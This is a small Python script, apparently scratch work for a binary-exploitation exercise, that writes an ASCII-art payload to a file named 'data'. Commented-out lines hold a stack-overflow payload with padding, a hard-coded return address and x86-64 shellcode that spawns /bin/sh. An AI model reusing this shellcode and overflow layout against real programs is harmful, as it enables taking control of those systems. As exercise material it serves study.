
#payload = b"A"*928 + b"BBBBBBBB" + b"\x68\xd8\xff\xff\xff\x7f"
#shell = b"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"
#payload = shell + b"A"*(928-len(shell)) + b"BBBBBBBB" + b"\x20\xdc\xff\xff\xff\x7f"


payload = '''
   //
 _oo\\
(__/ \  _  _
   \  \/ \/ \\
   (         )\\
    \_______/  \\
     [[] [[]
     [[] [[]    
'''

# payload = '''
#                      /\    .-" /
#                     /  ; .'  .' 
#                    :   :/  .'   
#                     \  ;-.'     
#        .--""""--..__/     `.    
#      .'           .'    `o  \   
#     /                    `   ;  
#    :                  \      :  
#  .-;        -.         `.__.-'  
# :  ;          \     ,   ;       
# '._:           ;   :   (        
#     \/  .__    ;    \   `-.     
#  bug ;     "-,/_..--"`-..__)    
#      '""--.._:             E
# '''

print(len(payload))

with open("data","w") as f:
    f.write(payload)
